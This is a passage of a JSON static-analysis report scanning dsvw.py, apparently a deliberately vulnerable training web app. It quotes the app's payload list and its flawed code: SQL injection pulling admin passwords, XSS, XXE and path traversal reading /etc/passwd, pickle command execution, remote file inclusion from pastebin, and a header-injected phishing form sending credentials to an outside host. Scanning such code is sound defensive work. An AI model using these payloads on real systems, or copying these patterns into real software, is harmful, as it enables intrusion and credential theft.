\"/?include=https%%3A%%2F%%2Fpastebin.com%%2Fraw%%2F6VyyNNhc&amp;cmd=%s\" % (\"ifconfig\" if os.name != \"nt\" else \"ipconfig\"), \"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.2-Testing_for_Remote_File_Inclusion\"), (\"HTTP Header Injection (<i>phishing</i>)\", \"/?charset=utf8\", \"/?charset=utf8%0D%0AX-XSS-Protection:0%0D%0AContent-Length:388%0D%0A%0D%0A%3C!DOCTYPE%20html%3E%3Chtml%3E%3Chead%3E%3Ctitle%3ELogin%3C%2Ftitle%3E%3C%2Fhead%3E%3Cbody%20style%3D%27font%3A%2012px%20monospace%27%3E%3Cform%20action%3D%22http%3A%2F%2Fdsvw.c1.biz%2Fi%2Flog.php%22%20onSubmit%3D%22alert(%27visit%20%5C%27http%3A%2F%2Fdsvw.c1.biz%2Fi%2Flog.txt%5C%27%20to%20see%20your%20phished%20credentials%27)%22%3EUsername%3A%3Cbr%3E%3Cinput%20type%3D%22text%22%20name%3D%22username%22%3E%3Cbr%3EPassword%3A%3Cbr%3E%3Cinput%20type%3D%22password%22%20name%3D%22password%22%3E%3Cinput%20type%3D%22submit%22%20value%3D%22Login%22%3E%3C%2Fform%3E%3C%2Fbody%3E%3C%2Fhtml%3E\", \"https://www.rapid7.com/db/vulnerabilities/http-generic-script-header-injection\"), (\"Component with Known Vulnerability (<i>pickle</i>)\", \"/?object=%s\" % urllib.parse.quote(pickle.dumps(dict((_.findtext(\"username\"), (_.findtext(\"name\"), _.findtext(\"surname\"))) for _ in xml.etree.ElementTree.fromstring(USERS_XML).findall(\"user\")))), \"/?object=cos%%0Asystem%%0A(S%%27%s%%27%%0AtR.%%0A\\\" onclick=\\\"alert('checking if arbitrary code can be executed remotely (true in case of delayed response)')\" % urllib.parse.quote(\"ping -c 5 127.0.0.1\" if os.name != \"nt\" else \"ping -n 5 127.0.0.1\"), \"https://www.cs.uic.edu/~s/musings/pickle.html\"), (\"Denial of Service (<i>memory</i>)\", \"/?size=32\", \"/?size=9999999\", \"https://owasp.org/www-community/attacks/Denial_of_Service\"))", "highlightLines": [12]}, "category": "code", "location": {"file": "dsvw.py", "line": 12, "column": 9299}, "severity": "medium", "references": [], "description": ""}, {"id": "473874532709", "fix": {"template": null, "available": false}, "title": "XML parsing with variable data - XXE risk (CWE-611)", "ruleId": "rules.py-xxe-parse-var", "snippet": {"code": "CASES = ((\"Blind SQL Injection (<i>boolean</i>)\", \"?id=2\", \"/?id=2%20AND%20SUBSTR((SELECT%20password%20FROM%20users%20WHERE%20name%3D%27admin%27)%2C1%2C1)%3D%277%27\\\" onclick=\\\"alert('checking if the first character for admin\\\\'s password is digit \\\\'7\\\\' (true in case of same result(s) as for \\\\'vulnerable\\\\')')\", \"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection#boolean-exploitation-technique\"), (\"Blind SQL Injection (<i>time</i>)\", \"?id=2\", \"/?id=(SELECT%20(CASE%20WHEN%20(SUBSTR((SELECT%20password%20FROM%20users%20WHERE%20name%3D%27admin%27)%2C2%2C1)%3D%27e%27)%20THEN%20(LIKE(%27ABCDEFG%27%2CUPPER(HEX(RANDOMBLOB(300000000)))))%20ELSE%200%20END))\\\" onclick=\\\"alert('checking if the second character for admin\\\\'s password is letter \\\\'e\\\\' (true in case of delayed response)')\", \"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection#time-delay-exploitation-technique\"), (\"UNION SQL Injection\", \"?id=2\", \"/?id=2%20UNION%20ALL%20SELECT%20NULL%2C%20NULL%2C%20NULL%2C%20(SELECT%20id%7C%7C%27%2C%27%7C%7Cusername%7C%7C%27%2C%27%7C%7Cpassword%20FROM%20users%20WHERE%20username%3D%27admin%27)\", \"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection#union-exploitation-technique\"), (\"Login Bypass\", \"/login?username=&amp;password=\", \"/login?username=admin&amp;password=%27%20OR%20%271%27%20LIKE%20%271\", \"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection#classic-sql-injection\"), (\"HTTP Parameter Pollution\", \"/login?username=&amp;password=\", \"/login?username=admin&amp;password=%27%2F*&amp;password=*%2FOR%2F*&amp;password=*%2F%271%27%2F*&amp;password=*%2FLIKE%2F*&amp;password=*%2F%271\", \"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/04-Testing_for_HTTP_Parameter_Pollution\"), (\"Cross Site Scripting (<i>reflected</i>)\", \"/?v=0.4\", \"/?v=0.4%3Cscript%3Ealert(%22arbitrary%20javascript%22)%3C%2Fscript%3E\", \"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/01-Testing_for_Reflected_Cross_Site_Scripting\"), (\"Cross Site Scripting (<i>stored</i>)\", \"/?comment=\\\" onclick=\\\"document.location='/?comment='+prompt('please leave a comment'); return false\", \"/?comment=%3Cscript%3Ealert(%22arbitrary%20javascript%22)%3C%2Fscript%3E\", \"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/02-Testing_for_Stored_Cross_Site_Scripting\"), (\"Cross Site Scripting (<i>DOM</i>)\", \"/?#lang=en\", \"/?foobar#lang=en%3Cscript%3Ealert(%22arbitrary%20javascript%22)%3C%2Fscript%3E\", \"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/01-Testing_for_DOM-based_Cross_Site_Scripting\"), (\"Cross Site Scripting (<i>JSONP</i>)\", \"/users.json?callback=process\\\" onclick=\\\"var script=document.createElement('script');script.src='/users.json?callback=process';document.getElementsByTagName('head')[0].appendChild(script);return false\", \"/users.json?callback=alert(%22arbitrary%20javascript%22)%3Bprocess\\\" onclick=\\\"var script=document.createElement('script');script.src='/users.json?callback=alert(%22arbitrary%20javascript%22)%3Bprocess';document.getElementsByTagName('head')[0].appendChild(script);return false\", \"http://www.metaltoad.com/blog/using-jsonp-safely\"), (\"XML External Entity (<i>local</i>)\", \"/?xml=%3Croot%3E%3C%2Froot%3E\", \"/?xml=%3C!DOCTYPE%20example%20%5B%3C!ENTITY%20xxe%20SYSTEM%20%22file%3A%2F%2F%2Fetc%2Fpasswd%22%3E%5D%3E%3Croot%3E%26xxe%3B%3C%2Froot%3E\" if os.name != \"nt\" else \"/?xml=%3C!DOCTYPE%20example%20%5B%3C!ENTITY%20xxe%20SYSTEM%20%22file%3A%2F%2FC%3A%2FWindows%2Fwin.ini%22%3E%5D%3E%3Croot%3E%26xxe%3B%3C%2Froot%3E\", \"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/07-Testing_for_XML_Injection\"), (\"XML External Entity (<i>remote</i>)\", \"/?xml=%3Croot%3E%3C%2Froot%3E\", \"/?xml=%3C!DOCTYPE%20example%20%5B%3C!ENTITY%20xxe%20SYSTEM%20%22http%3A%2F%2Fhttpbin.org%2Fbase64%2FSGVsbG8sIFdvcmxkIQ%3D%3D%22%3E%5D%3E%3Croot%3E%26xxe%3B%3C%2Froot%3E\", \"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/07-Testing_for_XML_Injection\"), (\"Server Side Request Forgery\", \"/?path=\", \"/?path=http%3A%2F%2F127.0.0.1%3A631\" if os.name != \"nt\" else \"/?path=%5C%5C127.0.0.1%5CC%24%5CWindows%5Cwin.ini\", \"http://www.bishopfox.com/blog/2015/04/vulnerable-by-design-understanding-server-side-request-forgery/\"), (\"Blind XPath Injection (<i>boolean</i>)\", \"/?name=dian\", \"/?name=admin%27%20and%20substring(password%2Ftext()%2C3%2C1)%3D%27n\\\" onclick=\\\"alert('checking if the third character for admin\\\\'s password is letter \\\\'n\\\\' (true in case of found item)')\", \"https://owasp.org/www-community/attacks/XPATH_Injection\"), (\"Cross Site Request Forgery\", \"/?comment=\", \"/?v=%3Cimg%20src%3D%22%2F%3Fcomment%3D%253Cdiv%2520style%253D%2522color%253Ared%253B%2520font-weight%253A%2520bold%2522%253EI%2520quit%2520the%2520job%253C%252Fdiv%253E%22%3E\\\" onclick=\\\"alert('please visit \\\\'vulnerable\\\\' page to see what this click has caused')\", \"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/05-Testing_for_Cross_Site_Request_Forgery\"), (\"Frame Injection (<i>phishing</i>)\", \"/?v=0.4\", \"/?v=0.4%3Ciframe%20src%3D%22https%3A%2F%2Fdemo.sekuripy.hr%2Fdsvw%2Flogin.html%22%20style%3D%22background-color%3Awhite%3Bz-index%3A10%3Btop%3A10%25%3Bleft%3A10%25%3Bposition%3Afixed%3Bborder-collapse%3Acollapse%3Bborder%3A1px%20solid%20%23a8a8a8%22%3E%3C%2Fiframe%3E\", \"http://www.gnucitizen.org/blog/frame-injection-fun/\"), (\"Frame Injection (<i>content spoofing</i>)\", \"/?v=0.4\", \"/?v=0.4%3Ciframe%20src%3D%22https%3A%2F%2Fdemo.sekuripy.hr%2Fdsvw%2Fframe.html%22%20style%3D%22background-color%3Awhite%3Bwidth%3A100%25%3Bheight%3A100%25%3Bz-index%3A10%3Btop%3A0%3Bleft%3A0%3Bposition%3Afixed%3B%22%20frameborder%3D%220%22%3E%3C%2Fiframe%3E\", \"http://www.gnucitizen.org/blog/frame-injection-fun/\"), (\"Clickjacking\", None, \"/?v=0.4%3Cdiv%20style%3D%22opacity%3A0%3Bfilter%3Aalpha(opacity%3D20)%3Bbackground-color%3A%23000%3Bwidth%3A100%25%3Bheight%3A100%25%3Bz-index%3A10%3Btop%3A0%3Bleft%3A0%3Bposition%3Afixed%3B%22%20onclick%3D%22document.location%3D%27https%3A%2F%2Fdemo.sekuripy.hr%2Fdsvw%2Fclickjacking.html%27%22%3E%3C%2Fdiv%3E%3Cscript%3Ealert(%22click%20anywhere%20on%20page%22)%3B%3C%2Fscript%3E\", \"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/09-Testing_for_Clickjacking\"), (\"Unvalidated Redirect\", \"/?redir=\", \"/?redir=https%3A%2F%2Fgeekprank.com%2F\", \"https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html\"), (\"Arbitrary Code Execution\", \"/?domain=www.google.com\", \"/?domain=www.google.com%3B%20ifconfig\" if os.name != \"nt\" else \"/?domain=www.google.com%26%20ipconfig\", \"https://en.wikipedia.org/wiki/Arbitrary_code_execution\"), (\"Full Path Disclosure\", \"/?path=\", \"/?path=foobar\", \"https://owasp.org/www-community/attacks/Full_Path_Disclosure\"), (\"Source Code Disclosure\", \"/?path=\", \"/?path=dsvw.py\", \"https://www.imperva.com/resources/glossary?term=source_code_disclosure\"), (\"Path Traversal\", \"/?path=\", \"/?path=..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd\" if os.name != \"nt\" else \"/?path=..%5C..%5C..%5C..%5C..%5C..%5CWindows%5Cwin.ini\", \"https://www.owasp.org/index.php/Path_Traversal\"), (\"File Inclusion (<i>remote</i>)\", \"/?include=\", \"/?include=https%%3A%%2F%%2Fpastebin.com%%2Fraw%%2F6VyyNNhc&amp;cmd=%s\" % (\"ifconfig\" if os.name != \"nt\" else \"ipconfig\"), \"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.2-Testing_for_Remote_File_Inclusion\"), (\"HTTP Header Injection (<i>phishing</i>)\", \"/?charset=utf8\", \"/?charset=utf8%0D%0AX-XSS-Protection:0%0D%0AContent-Length:388%0D%0A%0D%0A%3C!DOCTYPE%20html%3E%3Chtml%3E%3Chead%3E%3Ctitle%3ELogin%3C%2Ftitle%3E%3C%2Fhead%3E%3Cbody%20style%3D%27font%3A%2012px%20monospace%27%3E%3Cform%20action%3D%22http%3A%2F%2Fdsvw.c1.biz%2Fi%2Flog.php%22%20onSubmit%3D%22alert(%27visit%20%5C%27http%3A%2F%2Fdsvw.c1.biz%2Fi%2Flog.txt%5C%27%20to%20see%20your%20phished%20credentials%27)%22%3EUsername%3A%3Cbr%3E%3Cinput%20type%3D%22text%22%20name%3D%22username%22%3E%3Cbr%3EPassword%3A%3Cbr%3E%3Cinput%20type%3D%22password%22%20name%3D%22password%22%3E%3Cinput%20type%3D%22submit%22%20value%3D%22Login%22%3E%3C%2Fform%3E%3C%2Fbody%3E%3C%2Fhtml%3E\", \"https://www.rapid7.com/db/vulnerabilities/http-generic-script-header-injection\"), (\"Component with Known Vulnerability (<i>pickle</i>)\", \"/?object=%s\" % urllib.parse.quote(pickle.dumps(dict((_.findtext(\"username\"), (_.findtext(\"name\"), _.findtext(\"surname\"))) for _ in xml.etree.ElementTree.fromstring(USERS_XML).findall(\"user\")))), \"/?object=cos%%0Asystem%%0A(S%%27%s%%27%%0AtR.%%0A\\\" onclick=\\\"alert('checking if arbitrary code can be executed remotely (true in case of delayed response)')\" % urllib.parse.quote(\"ping -c 5 127.0.0.1\" if os.name != \"nt\" else \"ping -n 5 127.0.0.1\"), \"https://www.cs.uic.edu/~s/musings/pickle.html\"), (\"Denial of Service (<i>memory</i>)\", \"/?size=32\", \"/?size=9999999\", \"https://owasp.org/www-community/attacks/Denial_of_Service\"))", "highlightLines": [12]}, "category": "code", "location": {"file": "dsvw.py", "line": 12, "column": 9321}, "severity": "medium", "references": [], "description": ""}, {"id": "91ff8aef0cb2", "fix": {"template": null, "available": false}, "title": "SQLite table - consider using STRICT mode for type safety (SQLite 3.37+)", "ruleId": "rules.py-sql-create-table-no-strict", "snippet": {"code": "    cursor.execute(\"CREATE TABLE users(id INTEGER PRIMARY KEY AUTOINCREMENT, username TEXT, name TEXT, surname TEXT, password TEXT)\")", "highlightLines": [19]}, "category": "code", "location": {"file": "dsvw.py", "line": 19, "column": 21}, "severity": "info", "references": [], "description": ""}, {"id": "9f5c831a2082", "fix": {"template": null, "available": false}, "title": "User data inserted directly - ensure no hardcoded credentials (CWE-798)", "ruleId": "rules.py-hardcoded-password-insert", "snippet": {"code": "    cursor.executemany(\"INSERT INTO users(id, username, name, surname, password) VALUES(NULL, ?, ?, ?, ?)\", ((_.findtext(\"username\"), _.findtext(\"name\"), _.findtext(\"surname\"), _.findtext(\"password\")) for _ in xml.etree.ElementTree.fromstring(USERS_XML).findall(\"user\")))", "highlightLines": [20]}, "category": "code", "location": {"file": "dsvw.py", "line": 20, "column": 25}, "severity": "medium", "references": [], "description": ""}, {"id": "68c96af5df4b", "fix": {"template": null, "available": false}, "title": "Compiled regex findall - ensure pattern is not vulnerable to ReDoS", "ruleId": "rules.py-redos-compiled-findall", "snippet": {"code": "    cursor.executemany(\"INSERT INTO users(id, username, name, surname, password) VALUES(NULL, ?, ?, ?, ?)\", ((_.findtext(\"username\"), _.findtext(\"name\"), _.findtext(\"surname\"), _.findtext(\"password\")) for _ in xml.etree.ElementTree.fromstring(USERS_XML).findall(\"user\")))", "highlightLines": [20]}, "category": "code", "location": {"file": "dsvw.py", "line": 20, "column": 211}, "severity": "info", "references": [], "description": ""}, {"id": "8659b3fc74ef", "fix": {"template": null, "available": false}, "title": "XML Element findall with XPath - potential XPath injection (CWE-643)", "ruleId": "rules.py-xpath-etree-findall", "snippet": {"code": "    cursor.executemany(\"INSERT INTO users(id, username, name, surname, password) VALUES(NULL, ?, ?, ?, ?)\", ((_.findtext(\"username\"), _.findtext(\"name\"), _.findtext(\"surname\"), _.findtext(\"password\")) for _ in xml.etree.ElementTree.fromstring(USERS_XML).findall(\"user\")))", "highlightLines": [20]}, "category": "code", "location": {"file": "dsvw.py", "line": 20, "column": 211}, "severity": "medium", "references": [], "description": ""}, {"id": "70d336533aa6", "fix": {"template": null, "available": false}, "title": "XML parsing with variable data - XXE risk (CWE-611)", "ruleId": "rules.py-xxe-parse-var", "snippet": {"code": "    cursor.executemany(\"INSERT INTO users(id, username, name, surname, password) VALUES(NULL, ?, ?, ?, ?)\", ((_.findtext(\"username\"), _.findtext(\"name\"), _.findtext(\"surname\"), _.findtext(\"password\")) for _ in xml.etree.ElementTree.fromstring(USERS_XML).findall(\"user\")))", "highlightLines": [20]}, "category": "code", "location": {"file": "dsvw.py", "line": 20, "column": 233}, "severity": "medium", "references": [], "description": ""}, {"id": "98b5613389b6", "fix": {"template": null, "available": false}, "title": "SQLite table - consider using STRICT mode for type safety (SQLite 3.37+)", "ruleId": "rules.py-sql-create-table-no-strict", "snippet": {"code": "    cursor.execute(\"CREATE TABLE comments(id INTEGER PRIMARY KEY AUTOINCREMENT, comment TEXT, time TEXT)\")", "highlightLines": [21]}, "category": "code", "location": {"file": "dsvw.py", "line": 21, "column": 21}, "severity": "info", "references": [], "description": ""}, {"id": "4c78f1f88c07", "fix": {"template": null, "available": false}, "title": "Regex findall - ensure pattern is not vulnerable to ReDoS (CWE-1333)", "ruleId": "rules.py-redos-re-findall", "snippet": {"code": "        code, content, params, cursor = http.client.OK, HTML_PREFIX, dict((match.group(\"parameter\"), urllib.parse.unquote(','.join(re.findall(r\"(?:\\A|[?&])%s=([^&]+)\" % match.group(\"parameter\"), query)))) for match in re.finditer(r\"((\\A|[?&])(?P<parameter>[\\w\\[\\]]+)=)([^&]+)\", query)), connection.cursor()", "highlightLines": [26]}, "category": "code", "location": {"file": "dsvw.py", "line": 26, "column": 132}, "severity": "info", "references": [], "description": ""}, {"id": "f52fc34b3f68", "fix": {"template": null, "available": false}, "title": "Regex finditer - ensure pattern is not vulnerable to ReDoS (CWE-1333)", "ruleId": "rules.py-redos-re-finditer", "snippet": {"code": "        code, content, params, cursor = http.client.OK, HTML_PREFIX, dict((match.group(\"parameter\"), urllib.parse.unquote(','.join(re.findall(r\"(?:\\A|[?&])%s=([^&]+)\" % match.group(\"parameter\"), query)))) for match in re.finditer(r\"((\\A|[?&])(?P<parameter>[\\w\\[\\]]+)=)([^&]+)\", query)), connection.cursor()", "highlightLines": [26]}, "category": "code", "location": {"file": "dsvw.py", "line": 26, "column": 219}, "severity": "info", "references": [], "description": ""}, {"id": "487e984e37b9", "fix": {"template": null, "available": false}, "title": "SQL query with string concatenation - SQL injection risk", "ruleId": "rules.py-sql-concat", "snippet": {"code": "                    cursor.execute(\"SELECT id, username, name, surname FROM users WHERE id=\" + params[\"id\"])", "highlightLines": [30]}, "category": "code", "location": {"file": "dsvw.py", "line": 30, "column": 21}, "severity": "high", "references": [], "description": ""}, {"id": "948085cacb58", "fix": {"template": null, "available": false}, "title": "SQLite execute with concatenation - SQL injection (CWE-89)", "ruleId": "rules.py-sqlite-execute-concat", "snippet": {"code": "                    cursor.execute(\"SELECT id, username, name, surname FROM users WHERE id=\" + params[\"id\"])", "highlightLines": [30]}, "category": "code", "location": {"file": "dsvw.py", "line": 30, "column": 21}, "severity": "high", "references": [], "description": ""}, {"id": "82973d1cebd1", "fix": {"template": null, "available": false}, "title": "SQL injection - string concatenation in query (CWE-89)", "ruleId": "rules.py-sqli-string-concat", "snippet": {"code": "                    cursor.execute(\"SELECT id, username, name, surname FROM users WHERE id=\" + params[\"id\"])", "highlightLines": [30]}, "category": "code", "location": {"file": "dsvw.py", "line": 30, "column": 36}, "severity": "high", "references": [], "description": ""}, {"id": "42ee4dda6948", "fix": {"template": null, "available": false}, "title": "SQL injection - SELECT query concatenated with variable (CWE-89)", "ruleId": "rules.py-sqli-string-plus-var", "snippet": {"code": "                    cursor.execute(\"SELECT id, username, name, surname FROM users WHERE id=\" + params[\"id\"])", "highlightLines": [30]}, "category": "code", "location": {"file": "dsvw.py", "line": 30, "column": 36}, "severity": "high", "references": [], "description": ""}, {"id": "deae7d347d4b", "fix": {"template": null, "available": false}, "title": "SQL injection - WHERE clause built with string concatenation (CWE-89)", "ruleId": "rules.py-sqli-where-concat", "snippet": {"code": "                    cursor.execute(\"SELECT id, username, name, surname FROM users WHERE id=\" + params[\"id\"])", "highlightLines": [30]}, "category": "code", "location": {"file": "dsvw.py", "line": 30, "column": 36}, "severity": "high", "references": [], "description": ""}, {"id": "3894a9f83bfb", "fix": {"template": null, "available": false}, "title": "Regex sub - ensure pattern is not vulnerable to ReDoS (CWE-1333)", "ruleId": "rules.py-redos-re-sub", "snippet": {"code": "                    content += re.sub(r\"(v<b>)[^<]+(</b>)\", r\"\\g<1>%s\\g<2>\" % params[\"v\"], HTML_POSTFIX)", "highlightLines": [33]}, "category": "code", "location": {"file": "dsvw.py", "line": 33, "column": 32}, "severity": "info", "references": [], "description": ""}, {"id": "04f30c8ea9e4", "fix": {"template": null, "available": false}, "title": "pickle.loads() - insecure deserialization vulnerability", "ruleId": "rules.py-pickle-loads", "snippet": {"code": "                    content = str(pickle.loads(params[\"object\"].encode()))", "highlightLines": [35]}, "category": "code", "location": {"file": "dsvw.py", "line": 35, "column": 35}, "severity": "high", "references": [], "description": ""}, {"id": "3dd9f00fe8ba", "fix": {"template": null, "available": false}, "title": "File open with user input - potential path traversal", "ruleId": "rules.py-open-user-input", "snippet": {"code": "                    content = (open(os.path.abspath(params[\"path\"]), \"rb\") if not \"://\" in params[\"path\"] else urllib.request.urlopen(params[\"path\"])).read().decode()", "highlightLines": [37]}, "category": "code", "location": {"file": "dsvw.py", "line": 37, "column": 32}, "severity": "medium", "references": [], "description": ""}, {"id": "e6005e0c5cee", "fix": {"template": null, "available": false}, "title": "Potential path traversal - validate file path is not user-controlled (CWE-22)", "ruleId": "rules.py-path-traversal-open", "snippet": {"code": "                    content = (open(os.path.abspath(params[\"path\"]), \"rb\") if not \"://\" in params[\"path\"] else urllib.request.urlopen(params[\"path\"])).read().decode()", "highlightLines": [37]}, "category": "code", "location": {"file": "dsvw.py", "line": 37, "column": 32}, "severity": "medium", "references": [], "description": ""}, {"id": "4bcbabeb2c6b", "fix": {"template": null, "available": false}, "title": "File open with variable path - validate path to prevent path traversal (CWE-22)", "ruleId": "rules.py-path-traversal-open-var", "snippet": {"code": "                    content = (open(os.path.abspath(params[\"path\"]), \"rb\") if not \"://\" in params[\"path\"] else urllib.request.urlopen(params[\"path\"])).read().decode()", "highlightLines": [37]}, "category": "code", "location": {"file": "dsvw.py", "line": 37, "column": 32}, "severity": "medium", "references": [], "description": ""}, {"id": "08d3209a200f", "fix": {"template": null, "available": false}, "title": "Potential SSRF - urllib.urlopen with variable URL", "ruleId": "rules.py-ssrf-urllib", "snippet": {"code": "                    content = (open(os.path.abspath(params[\"path\"]), \"rb\") if not \"://\" in params[\"path\"] else urllib.request.urlopen(params[\"path\"])).read().decode()", "highlightLines": [37]}, "category": "code", "location": {"file": "dsvw.py", "line": 37, "column": 112}, "severity": "high", "references": [], "description": ""}, {"id": "26ab3bdf2020", "fix": {"template": null, "available": false}, "title": "URL open with user input - potential SSRF", "ruleId": "rules.py-urllib-user-url", "snippet": {"code": "                    content = (open(os.path.abspath(params[\"path\"]), \"rb\") if not \"://\" in params[\"path\"] else urllib.request.urlopen(params[\"path\"])).read().decode()", "highlightLines": [37]}, "category": "code", "location": {"file": "dsvw.py", "line": 37, "column": 112}, "severity": "medium", "references": [], "description": ""}, {"id": "3563adc3142c", "fix": {"template": null, "available": false}, "title": "urlopen without timeout - can cause indefinite blocking, vulnerable to slowloris attacks (CWE-400)", "ruleId": "rules.py-urlopen-no-timeout", "snippet": {"code": "                    content = (open(os.path.abspath(params[\"path\"]), \"rb\") if not \"://\" in params[\"path\"] else urllib.request.urlopen(params[\"path\"])).read().decode()", "highlightLines": [37]}, "category": "code", "location": {"file": "dsvw.py", "line": 37, "column": 127}, "severity": "medium", "references": [], "description": ""}, {"id": "c10cbf9a984f", "fix": {"template": null, "available": false}, "title": "subprocess.run() - verify user input is validated before use (CWE-78)", "ruleId": "rules.py-subprocess-run-no-shell", "snippet": {"code": "                    content = subprocess.run(\"nslookup \" + params[\"domain\"], shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE, text=True).stdout", "highlightLines": [39]}, "category": "code", "location": {"file": "dsvw.py", "line": 39, "column": 31}, "severity": "medium", "references": [], "description": ""}, {"id": "0e04bce5e668", "fix": {"template": null, "available": false}, "title": "subprocess.run with shell=True - command injection risk", "ruleId": "rules.py-subprocess-run-shell", "snippet": {"code": "                    content = subprocess.run(\"nslookup \" + params[\"domain\"], shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE, text=True).stdout", "highlightLines": [39]}, "category": "code", "location": {"file": "dsvw.py", "line": 39, "column": 31}, "severity": "high", "references": [], "description": ""}, {"id": "45f0acddd95b", "fix": {"template": null, "available": false}, "title": "lxml XML parsing - disable external entities", "ruleId": "rules.py-lxml-parse", "snippet": {"code": "                    found = lxml.etree.parse(io.BytesIO(USERS_XML.encode())).xpath(\".//user[name/text()='%s']\" % params[\"name\"])", "highlightLines": [43]}, "category": "code", "location": {"file": "dsvw.py", "line": 43, "column": 29}, "severity": "medium", "references": [], "description": ""}, {"id": "68ca7c8c7783", "fix": {"template": null, "available": false}, "title": "MongoDB find() with variable - ensure query is validated to prevent NoSQL injection (CWE-943)", "ruleId": "rules.py-nosqli-mongodb-find-var", "snippet": {"code": "                    content += \"<b>Surname:</b> %s%s\" % (found[-1].find(\"surname\").text if found else \"-\", HTML_POSTFIX)", "highlightLines": [44]}, "category": "code", "location": {"file": "dsvw.py", "line": 44, "column": 58}, "severity": "medium", "references": [], "description": ""}, {"id": "4dcdd20e2bc1", "fix": {"template": null, "available": false}, "title": "XML Element find with XPath - potential XPath injection (CWE-643)", "ruleId": "rules.py-xpath-etree-find", "snippet": {"code": "                    content += \"<b>Surname:</b> %s%s\" % (found[-1].find(\"surname\").text if found else \"-\", HTML_POSTFIX)", "highlightLines": [44]}, "category": "code", "location": {"file": "dsvw.py", "line": 44, "column": 58}, "severity": "medium", "references": [], "description": ""}, {"id": "2fb0979ea63d", "fix": {"template": null, "available": false}, "title": "SQL query with string formatting - SQL injection risk", "ruleId": "rules.py-sql-format", "snippet": {"code": "                        cursor.execute(\"INSERT INTO comments VALUES(NULL, '%s', '%s')\" % (params[\"comment\"], time.ctime()))", "highlightLines": [50]}, "category": "code", "location": {"file": "dsvw.py", "line": 50, "column": 25}, "severity": "high", "references": [], "description": ""}, {"id": "090ea74d1aff", "fix": {"template": null, "available": false}, "title": "SQLite execute with string formatting - SQL injection (CWE-89)", "ruleId": "rules.py-sqlite-execute-format", "snippet": {"code": "                        cursor.execute(\"INSERT INTO comments VALUES(NULL, '%s', '%s')\" % (params[\"comment\"], time.ctime()))", "highlightLines": [50]}, "category": "code", "location": {"file": "dsvw.py", "line": 50, "column": 25}, "severity": "high", "references": [], "description": ""}, {"id": "88779ec485c2", "fix": {"template": null, "available": false}, "title": "File open with user input - potential path traversal", "ruleId": "rules.py-open-user-input", "snippet": {"code": "                    backup, sys.stdout, program, envs = sys.stdout, io.StringIO(), (open(params[\"include\"], \"rb\") if not \"://\" in params[\"include\"] else urllib.request.urlopen(params[\"include\"])).read(), {\"DOCUMENT_ROOT\": os.getcwd(), \"HTTP_USER_AGENT\": self.headers.get(\"User-Agent\"), \"REMOTE_ADDR\": self.client_address[0], \"REMOTE_PORT\": self.client_address[1], \"PATH\": path, \"QUERY_STRING\": query}", "highlightLines": [56]}, "category": "code", "location": {"file": "dsvw.py", "line": 56, "column": 85}, "severity": "medium", "references": [], "description": ""}, {"id": "76b3fa00d3c6", "fix": {"template": null, "available": false}, "title": "Potential path traversal - validate file path is not user-controlled (CWE-22)", "ruleId": "rules.py-path-traversal-open", "snippet": {"code": "                    backup, sys.stdout, program, envs = sys.stdout, io.StringIO(), (open(params[\"include\"], \"rb\") if not \"://\" in params[\"include\"] else urllib.request.urlopen(params[\"include\"])).read(), {\"DOCUMENT_ROOT\": os.getcwd(), \"HTTP_USER_AGENT\": self.headers.get(\"User-Agent\"), \"REMOTE_ADDR\": self.client_address[0], \"REMOTE_PORT\": self.client_address[1], \"PATH\": path, \"QUERY_STRING\": query}", "highlightLines": [56]}, "category": "code", "location": {"file": "dsvw.py", "line": 56, "column": 85}, "severity": "medium", "references": [], "description": ""}, {"id": "2db8e403af99", "fix": {"template": null, "available": false}, "title": "File open with variable path - validate path to prevent path traversal (CWE-22)", "ruleId": "rules.py-path-traversal-open-var", "snippet": {"code": "                    backup, sys.stdout, program, envs = sys.stdout, io.StringIO(), (open(params[\"include\"], \"rb\") if not \"://\" in params[\"include\"] else urllib.request.urlopen(params[\"include\"])).read(), {\"DOCUMENT_ROOT\": os.getcwd(), \"HTTP_USER_AGENT\": self.headers.get(\"User-Agent\"), \"REMOTE_ADDR\": self.client_address[0], \"REMOTE_PORT\": self.client_address[1], \"PATH\": path, \"QUERY_STRING\": query}", "highlightLines": [56]}, "category": "code", "location": {"file": "dsvw.py", "line": 56, "column": 85}, "severity": "medium", "references": [], "description": ""}, {"id": "4ea6d5206378", "fix": {"template": null, "available": false}, "title": "Potential SSRF - urllib.urlopen with variable URL", "ruleId": "rules.py-ssrf-urllib", "snippet": {"code": "                    backup, sys.stdout, program, envs = sys.stdout, io.StringIO(), (open(params[\"include\"], \"rb\") if not \"://\" in params[\"include\"] else urllib.request.urlopen(params[\"include\"])).read(), {\"DOCUMENT_ROOT\": os.getcwd(), \"HTTP_USER_AGENT\": self.headers.get(\"User-Agent\"), \"REMOTE_ADDR\": self.client_address[0], \"REMOTE_PORT\": 